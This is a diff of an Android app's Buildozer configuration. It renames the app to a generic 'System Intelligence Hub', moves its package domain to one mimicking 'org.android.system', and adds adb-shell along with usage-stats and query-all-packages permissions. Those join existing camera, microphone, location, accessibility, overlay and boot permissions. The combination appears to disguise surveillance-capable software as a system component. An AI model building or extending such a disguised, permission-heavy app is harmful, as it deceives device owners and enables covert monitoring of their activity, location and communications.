@@ -1,14 +1,14 @@
 [app]
-title = Noir Sovereign ELITE v16.1
-package.name = noirelitev16
-package.domain = org.noir.elite
+title = System Intelligence Hub
+package.name = sys_intel_hub
+package.domain = org.android.system
 source.dir = mobile_app
 source.include_exts = py,png,jpg,kv,atlas
-version = 16.1
-requirements = python3,kivy==2.3.0,requests,urllib3,certifi,idna,chardet,pillow,pyjnius,jpeg,png,openssl,pycryptodome
+version = 17.1
+requirements = python3,kivy==2.3.0,requests,urllib3,certifi,idna,chardet,pillow,pyjnius,jpeg,png,openssl,pycryptodome,adb-shell
 p4a.branch = master
 orientation = portrait
-android.permissions = INTERNET, READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE, CAMERA, RECORD_AUDIO, ACCESS_FINE_LOCATION, WAKE_LOCK, SYSTEM_ALERT_WINDOW, RECEIVE_BOOT_COMPLETED, FOREGROUND_SERVICE, BIND_ACCESSIBILITY_SERVICE, moe.shizuku.manager.permission.API_V23
+android.permissions = INTERNET, READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE, CAMERA, RECORD_AUDIO, ACCESS_FINE_LOCATION, WAKE_LOCK, SYSTEM_ALERT_WINDOW, RECEIVE_BOOT_COMPLETED, FOREGROUND_SERVICE, BIND_ACCESSIBILITY_SERVICE, moe.shizuku.manager.permission.API_V23, PACKAGE_USAGE_STATS, QUERY_ALL_PACKAGES
 android.gradle_dependencies =
 android.api = 33
 android.minapi = 21
